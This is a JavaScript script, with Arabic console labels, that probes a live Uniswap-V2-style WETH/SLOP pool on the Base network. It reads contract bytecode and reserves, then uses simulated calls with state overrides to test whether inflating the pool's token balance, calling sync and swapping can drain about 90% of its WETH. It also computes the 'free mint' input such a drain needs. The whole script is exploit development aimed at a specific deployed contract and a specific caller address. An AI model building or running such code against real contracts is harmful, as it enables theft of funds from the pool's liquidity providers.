import { keccak256, concat, zeroPadValue, toBeHex, formatUnits, formatEther } from "ethers";

const R = "https://mainnet.base.org";
const T = "0xA5a3A7a1dec1a57E41A0Cdd8c2129CfD7B46b592";
const P = "0x69249e64fd8D35036965fa09FadAEdb955D70C31";
const W = "0x4200000000000000000000000000000000000006";
const ME = "0xA4BC81CecCC9D8637147Fa4b5daAf55E8f9Ef33f";
const F = "0x2222222222222222222222222222222222222222";

const j = async (m, pr) => (await fetch(R, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: m, params: pr }) })).json();
const pad = a => "0".repeat(24) + a.slice(2).toLowerCase();
const w32 = n => BigInt(n).toString(16).padStart(64, "0");
const slot = (a, s) => keccak256(concat([zeroPadValue(a, 32), toBeHex(s, 32)]));
const bn = async (to, data) => { const r = await j("eth_call", [{ to, data }, "latest"]); return r.error ? null : BigInt(r.result); };
const dec = d => { if (!d || !d.startsWith("0x08c379a0")) return "(بلا نص)"; try { const n = parseInt(d.slice(66, 130), 16); return Buffer.from(d.slice(130, 130 + n * 2), "hex").toString(); } catch { return "?"; } };
const strings = hex => { const o = new Set(); let c = ""; for (let i = 0; i < hex.length; i += 2) { const b = parseInt(hex.substr(i, 2), 16); if (b >= 32 && b < 127) c += String.fromCharCode(b); else { if (c.length >= 6) o.add(c); c = ""; } } return [...o]; };

const codeP = (await j("eth_getCode", [P, "latest"])).result;
console.log("حجم كود الحوض:", (codeP.length - 2) / 2, "بايت");
console.log("\n=== نصوص الرفض داخل الحوض ===");
console.log(strings(codeP.slice(2)).join("\n") || "—");
console.log("\n=== نصوص الرفض داخل التوكن ===");
const codeT = (await j("eth_getCode", [T, "latest"])).result;
console.log(strings(codeT.slice(2)).join("\n") || "—");

const rv = (await j("eth_call", [{ to: P, data: "0x0902f1ac" }, "latest"])).result;
const r0 = BigInt("0x" + rv.slice(2, 66)), r1 = BigInt("0x" + rv.slice(66, 130));
const ts = BigInt("0x" + rv.slice(130, 138));
const tk0 = "0x" + (await j("eth_call", [{ to: P, data: "0x0dfe1681" }, "latest"])).result.slice(-40).toLowerCase();
const isW0 = tk0 === W.toLowerCase();
const rW = isW0 ? r0 : r1, rS = isW0 ? r1 : r0;
const balW = await bn(W, "0x70a08231" + pad(P));
const balT = await bn(T, "0x70a08231" + pad(P));
console.log("\nreserve WETH:", formatEther(rW), "| reserve SLOP:", formatUnits(rS, 9));
console.log("رصيد WETH:", formatEther(balW), "| رصيد SLOP:", formatUnits(balT, 9));
console.log("فرق WETH:", (balW - rW).toString(), "| فرق SLOP:", (balT - rS).toString());

const mkSwap = (o, to) => "0x022c0d9f" + (isW0 ? w32(o) + w32(0) : w32(0) + w32(o)) + pad(to) + w32(0x80) + w32(0);
const call = async (lbl, data, ov, to = P, from = ME) => {
  const pr = [{ from, to, data, gas: "0x90000" }, "latest"];
  if (ov) pr.push(ov);
  const r = await j("eth_call", pr);
  console.log((r.error ? "✗ " : "✓ ") + lbl + (r.error ? "  " + dec(r.error.data) : ""));
  return !r.error;
};

const ovBal = extra => ({ [T]: { stateDiff: { [slot(P, 1)]: "0x" + (balT + extra).toString(16).padStart(64, "0") } } });

console.log("\n=== سلّم المخرج (حالة غير متزامنة، مع فائض ضخم) ===");
const big = 10n ** 21n;
for (const o of [1n, 10n ** 6n, 10n ** 12n, 10n ** 15n, 10n ** 16n, 10n ** 17n, 10n ** 18n, 10n ** 19n, 5n * 10n ** 19n, 10n ** 20n, 14n * 10n ** 19n, 148n * 10n ** 18n]) {
  await call(formatEther(o) + " WETH", mkSwap(o, ME), ovBal(big));
}

console.log("\n=== هل المشكلة في العنوان المستلم؟ ===");
await call("إلى عنوان طازج", mkSwap(10n ** 18n, F), ovBal(big));

console.log("\n=== الفرضية: الحوض يرفض الفائض — اختبار sync ===");
const okSync = await call("sync()", "0x", undefined);
if (okSync) {
  const syncOv = { [P]: { stateDiff: { "0x8": "0x" + (BigInt(balW) | (BigInt(balT) << 112n) | (ts << 224n)).toString(16).padStart(64, "0") } } };
  console.log("\n=== swap بعد sync (احتياطي = رصيد) ===");
  for (const o of [1n, 10n ** 18n, 10n ** 19n, 5n * 10n ** 19n, 10n ** 20n, 14n * 10n ** 19n]) {
    await call(formatEther(o) + " WETH", mkSwap(o, ME), syncOv);
  }

  console.log("\n=== التتابع الكامل: sync ثم airdrop ثم swap ===");
  const X = 10n ** 21n;
  const ov2 = {
    [P]: { stateDiff: { "0x8": "0x" + (BigInt(balW) | ((BigInt(balT) + X) << 112n) | (ts << 224n)).toString(16).padStart(64, "0") } },
    [T]: { stateDiff: { [slot(P, 1)]: "0x" + (BigInt(balT) + X).toString(16).padStart(64, "0") } }
  };
  const outT = BigInt(balW) * 90n / 100n;
  await call("swap " + formatEther(outT) + " WETH بعد sync+ضخ", mkSwap(outT, ME), ov2);
  const inNeed = (BigInt(balT) + X) * outT * 1000n / (997n * (BigInt(balW) - outT)) + 1n;
  console.log("الدخول اللازم لـ 90% بعد sync:", formatUnits(inNeed, 9), "SLOP (سك مجاني)");
}
